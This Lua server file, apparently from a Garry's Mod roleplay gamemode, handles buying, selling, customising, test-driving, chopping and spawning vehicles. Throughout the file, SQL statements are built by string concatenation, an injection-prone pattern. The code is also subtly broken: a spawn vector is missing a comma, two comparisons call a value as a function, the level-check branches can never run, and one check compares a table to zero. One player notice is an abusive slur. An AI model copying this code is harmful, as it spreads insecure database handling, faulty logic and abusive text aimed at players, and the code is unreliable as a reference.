

local seatSituationMode = nil;
local IsCustomizing = nil;

local vehicleSpawnPos = {
//							{Gov Only?, Vector, Angle}

							// Civies
							{false, Vector(4870, -5210, 80), Angle(0, 180, 0)}, 
							{false, Vector(5150, -5210, 80), Angle(0, 180, 0)}, 
							{false, Vector(5430, -5210, 80), Angle(0, 180, 0)}, 
							{false, Vector(5710, -5210, 80), Angle(0, 180, 0)}, 
							{false, Vector(5990, -5210, 80), Angle(0, 180, 0)}, 
							
							{false, Vector(-5252.4648, -10529.8564, 82.3343), Angle(0, -90, 0)}, 
							{false, Vector(-5052.4648, -10529.8564, 82.3343), Angle(0, -90, 0)}, 
							{false, Vector(-4852.4648, -10529.8564, 82.3343), Angle(0, -90, 0)}, 
							{false, Vector(-4652.4648, -10529.8564, 82.3343), Angle(0, -90, 0)}, 
							{false, Vector(-4452.4648, -10529.8564, 82.3343), Angle(0, -90, 0)}, 
							{false, Vector(-4252.4648, -10529.8564, 82.3343), Angle(0, -90, 0)}, 
							{false, Vector(-4052.4648, -10529.8564, 82.3343), Angle(0, -90, 0)}, 
							
							// Fire
							{TEAM_FIREMAN, Vector(-3622.5212, -8225.4053, 200.2129), Angle(0, 180, 0)}, 
							{TEAM_FIREMAN, Vector(-3622.5212, -7951.0146, 200.2129), Angle(0, 180, 0)}, 
							{TEAM_FIREMAN, Vector(-3622.5212, -7665.6211, 200.2129), Angle(0, 180, 0)},       
							
							// Cop
							{TEAM_POLICE, Vector(-7623.5034, -8955.1650, -186.0401), Angle(0, 0, 0)}, 
							{TEAM_POLICE, Vector(-7628.9409, -9205.7363, -186.0403), Angle(0, 0, 0)}, 
							{TEAM_POLICE, Vector(-7628.9409, -9492.1416, -186.0403), Angle(0, 0, 0)}, 
							{TEAM_POLICE, Vector(-6924.4512, -8948.3740, -186.0405), Angle(0, -180, 0)}, 
							{TEAM_POLICE, Vector(-6924.5161, -9205.1504, -186.0405), Angle(0, -180, 0)}, 
							{TEAM_POLICE, Vector(-6924.5161, -9492.1416, -186.0405), Angle(0, -180, 0)}, 
							
							// SWAT
							{TEAM_SWAT, Vector(-7605.5474, -10009.7510, -186.4136), Angle(0, 90, 0)}, 
							{TEAM_SWAT, Vector(-7605.5474, -9771.7568, -186.4136), Angle(0, 90, 0)}, 
							
							// SWAT
							{TEAM_SECRET_SERVICE, Vector(-7267.3608, -9146.0469, -185.8752), Angle(0, 180, 0)}, 
							
							// Medic
							{TEAM_MEDIC, Vector(-3622.5212, -8225.4053, 200.2129), Angle(0, 180, 0)}, 
							{TEAM_MEDIC, Vector(-3622.5212, -7951.0146, 200.2129), Angle(0, 180, 0)}, 
							{TEAM_MEDIC, Vector(-3622.5212, -7665.6211, 200.2129), Angle(0, 180, 0)},   
							
							// Tow Truck Driver
							{TEAM_ROADCREW, Vector(882.102600, 4015.279053, 72), Angle(0, 180, 0)},
							{TEAM_ROADCREW, Vector(903.631592, 3796.215332, 72), Angle(0, 180, 0)},
							
							// Bus Driver
							{TEAM_BUSDRIVER, Vector(-5660.895996, -7160.113281, 72), Angle(0, 90, 0)},
							{TEAM_BUSDRIVER, Vector(-5651.005371 -6486.180664, 72), Angle(0, 90, 0)},
						}

function PLAYER:parseVehicleString ( input )
	local itemInfo = string.Explode(";", string.Trim(input));
	
	for k, v in pairs(itemInfo) do
		local splitAgain = string.Explode(",", v);
		
			self.Vehicles[splitAgain[1]] = {tonumber(splitAgain[2] or 1), tonumber(splitAgain[3] or 1), tonumber(splitAgain[4] or 0), tonumber(splitAgain[5] or 0)};
		if (#splitAgain > 0) then
		end
	end
end

function PLAYER:CompileVehicles ( )
	local saveString = "";
	
	for k, v in pairs(self.Vehicles) do
		if (k && tostring(k) != "" && string.len(tostring(k)) == 1) then 
			saveString = saveString .. tostring(k) .. "," .. v[1] .. "," .. v[2] .. "," .. v[3] .. "," .. v[4] .. ";";
		end
	end
	
	return saveString;
end

local function buyVehicle ( Player, Cmd, Args )
	if (!Args[1]) then return; end
	
	local vehicleID = Args[1];
	local vehicleTable = VEHICLE_DATABASE[vehicleID];
	
	if (!vehicleTable) then return; end
	if (vehicleTable.RequiredClass) then return; end
	
	//for ppl trying to type the command without vip
	if (Player:GetLevel() > 97) then
		if (vehicleID == '9' || vehicleID == 'R' || vehicleID == '8' || vehicleID == 'P' || vehicleID == 'I' || vehicleID == 'N' || vehicleID == 'M' || vehicleID == 'K') then
			Player:Notify("Nope.");
			return;
		end
	elseif (Player:GetLevel() > 98) then
		if (vehicleID == 'S' || vehicleID == 'O' || vehicleID == '1' || vehicleID == 'Q' || vehicleID == 'J' || vehicleID == '7' || vehicleID == 'H') then
			Player:Notify("Nope.");
			return;
		end
	elseif (Player:GetLevel() > 99) then
		if (vehicleID == '5' || vehicleID == 'C' || vehicleID == '2' || vehicleID == 'A' || vehicleID == 'B' || vehicleID 'D' || vehicleID == '6' || vehicleID == 'L' || vehicleID == '3' || vehicleID == 'E' || vehicleID '4' || vehicleID == 'F' || vehicleID == 'G') then
			Player:Notify("Nope.");
			return
		end
	end
	
	local cost = vehicleTable.Cost + math.Round(vehicleTable.Cost * GAMEMODE.GetTaxRate_Sales())
	
	if (Player:GetBank() < cost) then return; end
	
	GAMEMODE.GiveCityMoney(math.Round(vehicleTable.Cost * GAMEMODE.GetTaxRate_Sales()))
	Player:TakeBank(cost, true);
	Player.Vehicles[vehicleID] = {1, 1, 0, 0};
	
	tmysql.query("UPDATE `perp_users` SET `vehicles`='" .. Player:CompileVehicles() .. "' WHERE `id`='" .. Player.SMFID .. "'");
	Player:SetPrivateInt("lastcar", vehicleTable.ID)
	Player:Save();
	
	if (!vehicleTable.RequiredClass && Player:Team() != TEAM_CITIZEN) then return; end
	
	GAMEMODE.SpawnVehicle(Player, vehicleID, Player.Vehicles[vehicleID]);
end
concommand.Add("perp_v_p", buyVehicle);

local function sellDaVehicle ( Player, Cmd, Args )
	if (Player:GetLevel() > 99) then 
		Player:Notify("Selling cars is for Silver and up VIP players only. Please donate to get this feature.");
		return;
	end
	if (!Args[1]) then return; end
	
	local vehicleID = Args[1];
	local vehicleTable = VEHICLE_DATABASE[vehicleID];
	if (!vehicleTable) then return; end
	if (vehicleTable.RequiredClass) then return; end
	if(not Player.Vehicles[vehicleID]) then return; end
	
	Player.Vehicles[vehicleID] = nil;
	
	tmysql.query("UPDATE `perp_users` SET `vehicles`='" .. Player:CompileVehicles() .. "' WHERE `id`='" .. Player:SteamID() .. "'")
	Player:Save();
	
	Player:AddBank(vehicleTable.Cost * 0.5);
	
	Player:Notify("You successfully sold your " .. vehicleTable.Name .. ".");
end
concommand.Add("perp_v_sellit", sellDaVehicle);

local function claimVehicle ( Player, Cmd, Args )
	if (!Args[1]) then return; end
	local vehicleID = Args[1];
	local vehicleTable = VEHICLE_DATABASE[vehicleID];
	if (!vehicleTable.Cost) then return; end
	if (vehicleTable.Cost == 0) then return; end
	if (!Player:HasVehicle(vehicleID)) then return; end
	if (!vehicleTable.RequiredClass && Player:Team() != TEAM_CITIZEN) then return; end
	
	GAMEMODE.SpawnVehicle(Player, vehicleID, Player.Vehicles[vehicleID]);
end
concommand.Add("perp_v_c", claimVehicle);

local function skinVehicle ( Player, Cmd, Args )
	if (!Args[1]) then return; end
	
	local skinID = tonumber(Args[1]);
	
	local theirVehicle = Player.currentVehicle;
	
	if (!theirVehicle || !IsValid(theirVehicle)) then return; end
	if (Player:GetCash() < theirVehicle.vehicleTable.PaintJobCost) then return; end
	
	if (!theirVehicle.vehicleTable.PaintJobs[skinID]) then 
		Msg("Missing paint job ID " .. theirVehicle.vehicleTable.Name .. " #" .. skinID .. "\n");
	return; end
	
	Player:TakeCash(theirVehicle.vehicleTable.PaintJobCost, true);
	
	if (theirVehicle.vehicleTable.PaintJobs[skinID].model != theirVehicle:GetModel()) then
		theirVehicle:SetModel(theirVehicle.vehicleTable.PaintJobs[skinID].model);
	end
	
	theirVehicle:SetSkin(theirVehicle.vehicleTable.PaintJobs[skinID].skin);
	
	Player.Vehicles[theirVehicle.vehicleTable.ID][1] = skinID;
	
	tmysql.query("UPDATE `perp_users` SET `vehicles`='" .. Player:CompileVehicles() .. "' WHERE `id`='" .. Player.SMFID .. "'");
end
concommand.Add("perp_v_s", skinVehicle);

local function setLightsVehicle ( Player, Cmd, Args )
	if (Player:GetLevel() > 99) then Player:Notify("Vip Only Feature") return; end
	if (!Args[1]) then return; end
	
	local lightID = tonumber(Args[1]);
	
	local theirVehicle = Player.currentVehicle;
	
	if (!theirVehicle || !IsValid(theirVehicle)) then return; end
	if (Player:GetCash() < theirVehicle.vehicleTable.PaintJobCost * 2) then return; end
	if (!HEADLIGHT_COLORS[lightID]) then return; end
	if (HEADLIGHT_COLORS[lightID][3] == "Gold" && !Player:IsGold()) then return; end
	
	Player:TakeCash(theirVehicle.vehicleTable.PaintJobCost * 2, true);
	
	if (theirVehicle.headLightColor != lightID) then
		theirVehicle.headLightColor = lightID;
		theirVehicle.lightManager:SetColor(Color(HEADLIGHT_COLORS[theirVehicle.headLightColor][1].r, HEADLIGHT_COLORS[theirVehicle.headLightColor][1].g, HEADLIGHT_COLORS[theirVehicle.headLightColor][1].b, 255));
		
		if (theirVehicle.Headlights) then
			for k, flashlight in pairs(theirVehicle.Headlights) do
				if (flashlight && IsValid(flashlight)) then
					local realColor = HEADLIGHT_COLORS[lightID][1];
					flashlight:SetKeyValue("lightcolor", realColor.r .. " " .. realColor.g .. " " .. realColor.b .. " " .. realColor.a);
				end
			end
		end
	end
		
	Player.Vehicles[theirVehicle.vehicleTable.ID][2] = lightID;
	
	tmysql.query("UPDATE `perp_users` SET `vehicles`='" .. Player:CompileVehicles() .. "' WHERE `id`='" .. Player.SMFID .. "'");
end
concommand.Add("perp_v_l", setLightsVehicle);

local function setHydVehicle ( Player, Cmd, Args )
	if (Player:GetLevel() > 99) then Player:Notify("Vip Only Feature") return; end
	
	local theirVehicle = Player.currentVehicle;
	
	if (!theirVehicle || !IsValid(theirVehicle)) then return; end
	
	if (Player.Vehicles[theirVehicle.vehicleTable.ID][3] == 1) then
		Player.Vehicles[theirVehicle.vehicleTable.ID][3] = 0;
	else
		if (Player:GetCash() < COST_FOR_HYDRAULICS) then return; end
		
		Player:TakeCash(COST_FOR_HYDRAULICS, true);
		Player.Vehicles[theirVehicle.vehicleTable.ID][3] = 1;
	end
	
	tmysql.query("UPDATE `perp_users` SET `vehicles`='" .. Player:CompileVehicles() .. "' WHERE `id`='" .. Player.SMFID .. "'");
end
concommand.Add("perp_v_j", setHydVehicle);

// Changes underglow color.
local function setUnderglowChange ( Player, Cmd, Args )
	if (Player:GetLevel() > 99) then Player:Notify("Vip Only Feature") return; end
	if (!Args[1]) then return; end
	
	local lightID = tonumber(Args[1]);
	
	local theirVehicle = Player.currentVehicle;
	
	if (!theirVehicle || !IsValid(theirVehicle)) then return; end
	if (Player:GetCash() < theirVehicle.vehicleTable.PaintJobCost * 2) then return; end
	if (!HEADLIGHT_COLORS[lightID]) then return; end
	
	Player:TakeCash(theirVehicle.vehicleTable.PaintJobCost * 2, true);
		
	if (theirVehicle.Underglow) then
		for k, underglowLight in pairs(theirVehicle.Underglow) do
			if (underglowLight && IsValid(underglowLight)) then
				local realColor = HEADLIGHT_COLORS[lightID][1];
				underglowLight:SetKeyValue("_light", realColor.r .. " " .. realColor.g .. " " .. realColor.b .. " " .. realColor.a);
			end
		end
	end

		
	Player.Vehicles[theirVehicle.vehicleTable.ID][4] = lightID;
	
	tmysql.query("UPDATE `perp_users` SET `vehicles`='" .. Player:CompileVehicles() .. "' WHERE `id`='" .. Player.SMFID .. "'");
end
concommand.Add("perp_v_ugc", setUnderglowChange);

// Adds & Removes underglow.
local function setUnderglowVehicle ( Player, Cmd, Args )
	if (Player:GetLevel() > 99) then Player:Notify("Vip Only Feature") return; end
	
	local theirVehicle = Player.currentVehicle;
	
	if (!theirVehicle || !IsValid(theirVehicle)) then return; end
	
	if (Player.Vehicles[theirVehicle.vehicleTable.ID][4] >= 1) then
		Player.Vehicles[theirVehicle.vehicleTable.ID][4] = 0;
	else
		if (Player:GetCash() < COST_FOR_UNDERGLOW) then return; end
		
		Player:TakeCash(COST_FOR_UNDERGLOW, true);
		Player.Vehicles[theirVehicle.vehicleTable.ID][4] = 1;
	end
	
	tmysql.query("UPDATE `perp_users` SET `vehicles`='" .. Player:CompileVehicles() .. "' WHERE `id`='" .. Player.SMFID .. "'");
end
concommand.Add("perp_v_uga", setUnderglowVehicle);


function PLAYER:RemoveCar ( )
	if self.VehicleRotator and self.VehicleRotator:IsValid() then
		self.VehicleRotator:Remove();
		self.VehicleRotator = nil;
	end
	
	if ValidEntity(self.currentVehicle) then
		if(self.currentVehicle.AlarmEntity) then
			self.currentVehicle.AlarmEntity:Stop();
		end
		self.currentVehicle:Remove();
		self.currentVehicle = nil;
	end
end

local function SetCarColor ( Player, Cmd, Args )
	if !Args[1] then return; end
	if !Player.IsCustomizing then return; end
	
	local red 		= Args[1];
	local green 	= Args[2];
	local blue		= Args[3];
	
	Player.currentVehicle:SetColor(Color(red, green, blue, 255))
end
concommand.Add("perp_scrgb", SetCarColor)

local function SaveCustomColor( Player, Cmd, Args )
	if !Args[1] then return; end
	if !Player.IsCustomizing then return; end
	
	if Player:GetCash() < 10000 then
		Player:Notify("Fuck off poor cunt. Come back with $10000")
		Player:ConCommand("perp_remove_car");
		return;
	else
		Player:TakeCash(10000);
	end

	local Red		= Args[1]
	local Green		= Args[2]
	local Blue		= Args[3]
	
	local CarID = Player.currentVehicle.vehicleTable.ID
	
	tmysql.query("SELECT `carid` FROM `customize_car` WHERE `steamid`='" .. Player:SteamID() .. "' AND `carid`='" .. CarID .. "'", function ( CustomCar )
		if (!Player or !IsValid(Player) or !Player:IsValid()) then return; end
		
		if (!CustomCar || !CustomCar[1] || CustomCar[1][1] != CarID) then
			tmysql.query("INSERT INTO `customize_car` (`steamid`, `carid`, `red`, `green`, `blue`) VALUES ('" .. Player:SteamID() .. "', '" .. CarID .. "', '" .. math.Round(Red) .. "', '" .. math.Round(Green) .. "', '" .. math.Round(Blue) .. "')");
		elseif(CustomCar[1][1] == CarID) then
			tmysql.query("UPDATE `customize_car` SET `red`='" .. math.Round(Red) .. "', `green`='" .. math.Round(Green) .. "', `blue`='" .. math.Round(Blue) .. "' WHERE `steamid`='" .. Player:SteamID() .. "' AND `carid`='" .. CarID .. "'");
		end
	end);
	
	timer.Simple(2, function() Player:Notify("Vehicle save completed.")

	Player:RemoveCar();
	Player.IsCustomizing = nil;
	
	IsCustomizing = false;
	
	GAMEMODE.SpawnVehicle(Player, CarID, Player.Vehicles[CarID]);
	
	end);
end
concommand.Add("perp_customize_this_shit", SaveCustomColor)

local function CustomizeVehicle ( Player, Cmd, Args )
	Player.IsCustomizing = true;
	
	if IsCustomizing then
		Player:Notify("Please wait your turn to customize.");
		return;
	else
		IsCustomizing = true;
	end
	
	local vehicleID = Args[1];
	local vehicleTable = VEHICLE_DATABASE[vehicleID];
	local paintJobS = vehicleTable.PaintJobs[1];

	Player:RemoveCar();

	local newVehicle = ents.Create("prop_vehicle_jeep");
		newVehicle:SetModel(paintJobS.model);
		newVehicle:SetSkin(paintJobS.skin);
		newVehicle:SetPos(Vector(4771, -3534, 100));
		newVehicle:SetAngles(Angle(0, -135, 0));
		newVehicle:SetKeyValue("vehiclescript", "scripts/vehicles/perp2_" .. vehicleTable.Script .. ".txt");
		newVehicle:Spawn();
	
	timer.Simple(2, function()
		newVehicle:SetSolid(SOLID_NONE);
		newVehicle:SetMoveType(MOVETYPE_NONE);
	end)
	
	if (vehicleTable.CustomBodyGroup) then
		newVehicle:Fire("setbodygroup", tostring(vehicleTable.CustomBodyGroup), 0);
	end
	
	local ID1 = math.random(1, 32);
	local ID2 = math.random(0, 76);
	local ID3 = math.random(0, 7);

	IDString = (""..ID1..""..ID2..""..ID3.."");
	
	newVehicle.CarDamage = 50;
	newVehicle.owner = Player;	
	newVehicle:Fire("lock", "", 0);
	
	newVehicle:SetNetworkedEntity("owner", Player);
	
	Player.currentVehicle = newVehicle;
	
	newVehicle.vehicleTable = vehicleTable;
end
concommand.Add("perp_cust_veh", CustomizeVehicle);

local function CancelCustom( Player, Cmd, Args)
	Player:RemoveCar()
	
	Player:Give("roleplay_keys");
	Player:Give("roleplay_fists");
	Player:Give("weapon_physcannon");
	
	if (Player:GetLevel() <= 100) then
		Player:Give("weapon_physgun");
	end
	
	if (Player:GetLevel() <= 10) then
		Player:Give("god_stick");
	end
	
	IsCustomizing = false;
end
concommand.Add("perp_remove_car", CancelCustom)
	
function GM.ChopShopPay( Player )

	local stolenVehicle;
	for k, ent in pairs(ents.FindInSphere(Vector(3859, 6658, 72), 250)) do
		if ent:IsValid() and ent:IsVehicle() and ent:GetClass() == "prop_vehicle_jeep" then
			stolenVehicle = ent;
		end
	end
	
	Player.lastVehicleChop= Player.lastVehicleChop or 0;
	if (Player.lastVehicleChop > CurTime()) then
		Player:Notify("There is a 30 minute cooldown on choping cars.");
		return;
	end
	
	local PaintCost = stolenVehicle.vehicleTable.PaintJobCost;
	local ChopPay = PaintCost / 3;
	
	ChopPay = math.Round(ChopPay);
	
	if ChopPay < 1400 then
		ChopPay = 1400;
	end
	
	if Player:StoleCar(stolenVehicle) then
		Player:GiveCash(ChopPay);
		Player:Notify("You made $'" .. ChopPay .. "' from the chop shop.");
		Player.StolenCar = nil;
		stolenVehicle:Remove();
		Player.lastVehicleChop = CurTime() + 1800;
	else
		Player:Notify("You cannot chop this vehicle.");
	end
end
concommand.Add("perp_chop_car", GM.ChopShopPay);

function PLAYER:StoleCar ( vehicle )
	if (!vehicle:IsVehicle()) then return false; end
	if (!vehicle:GetNetworkedEntity("owner") || !IsValid(vehicle:GetNetworkedEntity("owner"))) then return false; end
	
	if self:IsValid() && self:IsPlayer() then
		if self.StolenCar == vehicle then
			return true;
		end
	end
	return false;
end
	
function PLAYER:CanRideInCar ( vehicle )
	if (!vehicle:IsVehicle()) then return false; end
	if (!vehicle:GetNetworkedEntity("owner") || !IsValid(vehicle:GetNetworkedEntity("owner"))) then return false; end
	
	local owner = vehicle:GetNetworkedEntity("owner");
	
	// Mayor can ride with the secret service (duh)
	if (owner:Team() == TEAM_SECRET_SERVICE && self:Team() == TEAM_MAYOR) then return true; end
	if (owner:Team() == TEAM_POLICE && self:Team() == TEAM_CITIZEN && self.currentlyRestrained) then return true; end
	
	if (self:Team() == TEAM_MAYOR) then return false; end
	
	//let them in if THEY stole it
	if self:StoleCar(vehicle) then return true; end
	
	if (self:CanManipulateDoor(vehicle)) then return true; end
		
	// check organization members.
	if (owner:GetUMsgInt("org", 0) != 0 && GAMEMODE.OrganizationMembers[self:GetUMsgInt("org", 0)]) then
		for k, v in pairs(GAMEMODE.OrganizationMembers[self:GetUMsgInt("org", 0)]) do
			if (v[2] == self:UniqueID()) then
				return true;
			end
		end
	end
	
	// if theyre the same team, let 'em do it.
	if (self:Team() == owner:Team() && owner:Team() != TEAM_CITIZEN) then return true; end
	
	return false;
end

local function selectVehicleSpawn ( Player, vehicleID )
	local possibleLocations = {};
	
	for k, v in pairs(vehicleSpawnPos) do
		if (!v[1] || VEHICLE_DATABASE[vehicleID].RequiredClass == v[1]) then
			local canPlaceHere = true;
			
			for _, ent in pairs(ents.FindInSphere(v[2], 100)) do
				if (ent:GetClass() == "prop_vehicle_jeep") then
					canPlaceHere = false;
					break;
				end
			end
			
			if (canPlaceHere) then
				table.insert(possibleLocations, v);
			end
		end
	end	
	
	if (possibleLocations == 0) then return false; end
	
	local closestLocation;
	local closestDist = 100000;
	
	for k, v in pairs(possibleLocations) do
		local dist = v[2]:Distance(Player:GetPos());
		
		if (dist < closestDist) then
			closestLocation = v;
			closestDist = dist;
		end
	end
	
	if (!closestLocation) then return false; end
	
	return closestLocation;
end

function CreatePassengerSeat ( Entity, Vect, Angles )
	local SeatDatabase = list.Get("Vehicles")["Seat_Jeep"];
	local OurPos = Entity:GetPos();
	local OurAng = Entity:GetAngles();
	local SeatPos = OurPos + (OurAng:Forward() * Vect.x) + (OurAng:Right() * Vect.y) + (OurAng:Up() * Vect.z);
	
	local Seat = ents.Create("prop_vehicle_prisoner_pod");
	Seat:SetModel(SeatDatabase.Model);
	Seat:SetKeyValue("vehiclescript", "scripts/vehicles/prisoner_pod.txt");
	Seat:SetAngles(OurAng + Angles);
	Seat:SetPos(SeatPos);
	Seat:Spawn();
	Seat:Activate();
	Seat:SetParent(Entity);
	
	Seat:SetSolid(SOLID_NONE);
	Seat:SetMoveType(MOVETYPE_NONE);
	Seat:SetRenderMode(RENDERMODE_TRANSALPHA)
	
	if SeatDatabase.Members then table.Merge(Seat, SeatDatabase.Members); end
	if SeatDatabase.KeyValues then
		for k, v in pairs(SeatDatabase.KeyValues) do
			Seat:SetKeyValue(k, v);
		end
	end
	
	Seat:GetTable().ParentCar = Entity;
	Seat.VehicleName = "Jeep Seat";
	Seat.VehicleTable = SeatDatabase;
	Seat.ClassOverride = "prop_vehicle_prisoner_pod";
	
	table.insert(Entity.PassengerSeats, Seat);
	
	Seat.IsPassengerSeat = true;

	if (!seatSituationMode) then
		Seat:SetColor(Color(255, 255, 255, 0));
	end
end

local function TestDriveVehicle ( Player, Cmd, Args )
	Player.lastVehicleTest = Player.lastVehicleTest or 0;
	if (Player.lastVehicleTest > CurTime()) then 
		Player:Notify("You may only test drive a car every 5 minutes.");
		return; 
	end
	Player.lastVehicleTest = CurTime() + 300;
	
	local vehicleID = Args[1];
	local vehicleTable = VEHICLE_DATABASE[vehicleID];
	local paintJobS = vehicleTable.PaintJobs[1];

	Player:RemoveCar();
	
	local placeToSpawn = selectVehicleSpawn(Player, vehicleID);
	
	if (!placeToSpawn) then
		Player:Notify("Cannot find a place to spawn your vehicle.");
		return;
	end

	local newVehicle = ents.Create("prop_vehicle_jeep");
		newVehicle:SetModel(paintJobS.model);
		newVehicle:SetSkin(paintJobS.skin);
		newVehicle:SetPos(placeToSpawn[2]);
		newVehicle:SetAngles(placeToSpawn[3] - Angle(0, 90, 0));
		newVehicle:SetKeyValue("vehiclescript", "scripts/vehicles/perp2_" .. vehicleTable.Script .. ".txt");
		newVehicle:Spawn();
	
	if (vehicleTable.CustomBodyGroup) then
		newVehicle:Fire("setbodygroup", tostring(vehicleTable.CustomBodyGroup), 0);
	end
	
	newVehicle:SetNetworkedEntity("owner", Player);
	
	newVehicle.CarDamage = 50;
	newVehicle.owner = Player;	
	newVehicle:Fire("lock", "", 0);
	
	Player.currentVehicle = newVehicle;
	
	newVehicle.vehicleTable = vehicleTable;
	
	Player:Notify("Your 30 second test drive for the " .. vehicleTable.Name .. " has begun.");
	
	timer.Simple(10, function () Player:Notify("20 seconds remaining"); end)
	timer.Simple(20, function () Player:Notify("10 seconds remaining"); end)
	timer.Simple(27, function () Player:Notify("3 seconds remaining"); end)
	timer.Simple(28, function () Player:Notify("2 seconds remaining"); end)
	timer.Simple(29, function () Player:Notify("1 seconds remaining"); end)
	
	timer.Simple(30, function () 
		Player:Notify("Car test drive is over.");
		Player:RemoveCar();
		Player.HasDisabledCar = false;
	end)
end
concommand.Add("perp_test_veh", TestDriveVehicle);

function GM.SpawnVehicle ( Player, vehicleID, paintJob )
	Player.lastVehicleSpawn = Player.lastVehicleSpawn or 0;
	if (Player.lastVehicleSpawn > CurTime()) then return; end
	Player.lastVehicleSpawn = CurTime() + 1;
	
	Player.StolenCarTimeLimit = Player.StolenCarTimeLimit or 0;
	
	if Player.StolenCarTimeLimit > CurTime() then
		Player:Notify("Your car has been stolen in the past 3 minutes.");
		return;
	end
	
	if (Player.HasDisabledCar && Player:Team() == TEAM_CITIZEN) then 
		Player:Notify("You must get your car fixed before you can spawn another.");
		return;
	end
	
	local placeToSpawn = selectVehicleSpawn(Player, vehicleID);
	
	if (!placeToSpawn) then
		Player:Notify("Cannot find a place to spawn your vehicle.");
		return;
	end
	
	Player:RemoveCar();
	for k, v in pairs(player.GetAll()) do
		umsg.Start("removebadid", Player)
			umsg.Short(Player:GetCarUsed());		// Fuel Left
		umsg.End()
	end

	local vehicleTable = VEHICLE_DATABASE[vehicleID];
	
	//Player:Notify(""..Player:GetLastCar().."");
	if vehicleTable.DF then
		local NewCar = vehicleTable.FID;
		if Player:GetLastCar() == 0 or Player:GetLastCar() == nil then Car = tostring(a) end;
		Car = VEHICLE_DATABASE[Player:GetLastCar()];
		local FuelToSave = Player:GetFuel();
		
		//Player:Notify(""..FuelToSave.." "..NewCar.."");
		local ID = tonumber(Player:UniqueID());
		tmysql.query("SELECT `1` FROM `perp_fuel` WHERE `uid`='"..ID.."' LIMIT 1", function ( test )
			if (!test || !test[1]) then
				tmysql.query("INSERT INTO `perp_fuel` (`uid`) VALUES ('" .. tonumber(Player:UniqueID()) .. "')")
			end
		end)
		tmysql.query("UPDATE `perp_fuel` SET `"..Car.FID.."`='"..FuelToSave.."' WHERE `uid`='"..ID.."'");
		tmysql.query("SELECT `"..NewCar.."` FROM `perp_fuel` WHERE `uid`='"..ID.."' LIMIT 1", function ( car )
		if car[1] && car[1][1] then
			Player:SetFuel(tonumber(car[1][1]))
			umsg.Start("send_fuel", Player)
				umsg.Long(tonumber(car[1][1]));		// Fuel Left
			umsg.End();
		end
		if Player:GetFuel() == 0 then Player:SetFuel(tonumber(300)); end
		end)
	end

	
	local vehicleTable = VEHICLE_DATABASE[vehicleID];
	local paintJobS = vehicleTable.PaintJobs[paintJob[1]];
		
	local newVehicle = ents.Create("prop_vehicle_jeep");
		newVehicle:SetModel(paintJobS.model);
		newVehicle:SetSkin(paintJobS.skin);
		newVehicle:SetPos(placeToSpawn[2]);
		newVehicle:SetAngles(placeToSpawn[3] - Angle(0, 90, 0));
		newVehicle:SetKeyValue("vehiclescript", "scripts/vehicles/perp2_" .. vehicleTable.Script .. ".txt");
	newVehicle:Spawn();
		
	if (vehicleTable.CustomBodyGroup) then
		newVehicle:Fire("setbodygroup", tostring(vehicleTable.CustomBodyGroup), 0);
	end
	
	if (Player:Team() == TEAM_CITIZEN) then
		if (vehicleTable.ID == 'J' || vehicleTable.ID == 'S' || vehicleTable.ID == 'O' || vehicleTable.ID == '1' || vehicleTable.ID == 'Q' || vehicleTable.ID == 'T' || vehicleTable.ID == '7' || vehicleTable.ID == 'H' || vehicleTable.ID == 'P' || vehicleTable.ID == 'I' || vehicleTable.ID == 'N' || vehicleTable.ID == 'R' || vehicleTable.ID == '8' || vehicleTable.ID == 'M' || vehicleTable.ID == 'K' || vehicleTable.ID == '9') then
			tmysql.query("SELECT `red`, `green`, `blue` FROM `customize_car` WHERE `steamid`='" .. Player:SteamID() .. "' AND `carid`='" .. vehicleTable.ID .. "'", function ( CustomCarParts )
				if (CustomCarParts && CustomCarParts[1]) then
				
					local Red 		= CustomCarParts[1][1]
					local Green 	= CustomCarParts[1][2]
					local Blue 		= CustomCarParts[1][3]
			
					newVehicle:SetColor(Color(Red, Green, Blue))
				end
			end)
		end
	end
	
	newVehicle.CarDamage = 50;
	newVehicle.owner = Player;
	
	newVehicle:Fire("lock", "", 0);
	
	newVehicle:SetNetworkedEntity("owner", Player);
	local ID1 = math.random(1, 32);
	local ID2 = math.random(0, 76);
	local ID3 = math.random(0, 7);

	IDString = (""..ID1..""..ID2..""..ID3.."");
	
	newVehicle.CarDamage = 50;
	newVehicle.owner = Player;	
	newVehicle:Fire("lock", "", 0);
	CarID = tostring(vehicleTable.FID)
	
	newVehicle:SetNetworkedEntity("owner", Player);
	newVehicle:SetNetworkedInt("carid", IDString);
	Player:SetCarUsed(tonumber(newVehicle:GetNetworkedInt("carid")));
		
	ID = newVehicle:GetNetworkedInt("carid")
	
	
	umsg.Start("sendcarid", Player)
		umsg.Long(tonumber(ID));
	umsg.End();
	
	Player.currentVehicle = newVehicle;
	
	newVehicle.vehicleTable = vehicleTable;
	DF = vehicleTable.DF;
	--if !DF then Player:Notify("false") end
		
	if DF then Player:SetPrivateInt("lastcar", vehicleTable.ID) end;
	if DF then Player:SetPrivateInt("lastcarf", vehicleTable.FID) end;
	
	// Add pulley if its tow truck
	if(vehicleID == "%") then
		//-1.1618 4.7689 106.6799
		newVehicle.Thingy = ents.Create("ent_towtruck")
		newVehicle.Thingy:SetPos(newVehicle:GetPos() + newVehicle:GetUp() * 35 + newVehicle:GetForward() * -118 + newVehicle:GetRight() * -35)
		newVehicle.Thingy:SetAngles(newVehicle:GetAngles() + Angle(0, 270, 0))
		newVehicle.Thingy:SetVehicle(newVehicle)
		newVehicle.Thingy.ThePlayer = Player
		newVehicle.Thingy:Spawn()
	end
	
	// Make passenger seats
	newVehicle.PassengerSeats = {};
	if (vehicleTable.PassengerSeats) then
		for k, v in pairs(vehicleTable.PassengerSeats) do
			CreatePassengerSeat(newVehicle, v[1], v[2]);
		end
	end
	
	newVehicle.headLightColor = paintJob[2];
	
	// Add light controller
	newVehicle.lightManager = ents.Create("ent_light_manager");
		newVehicle.lightManager:SetPos(newVehicle:LocalToWorld(newVehicle:OBBCenter()) + newVehicle:GetForward() * 100 + newVehicle:GetUp() * 10);
		newVehicle.lightManager:SetColor(Color(HEADLIGHT_COLORS[newVehicle.headLightColor][1].r, HEADLIGHT_COLORS[newVehicle.headLightColor][1].g, HEADLIGHT_COLORS[newVehicle.headLightColor][1].b, 255));
	newVehicle.lightManager:Spawn();
	
	newVehicle.lightManager_Rear = ents.Create("ent_light_manager_rear");
		newVehicle.lightManager_Rear:SetPos(newVehicle:LocalToWorld(newVehicle:OBBCenter()) - newVehicle:GetForward() * 100 + newVehicle:GetUp() * 10);
	newVehicle.lightManager_Rear:Spawn();
	
	newVehicle.lightManager:SetParent(newVehicle);
	newVehicle.lightManager_Rear:SetParent(newVehicle);
				
	return newVehicle;
end

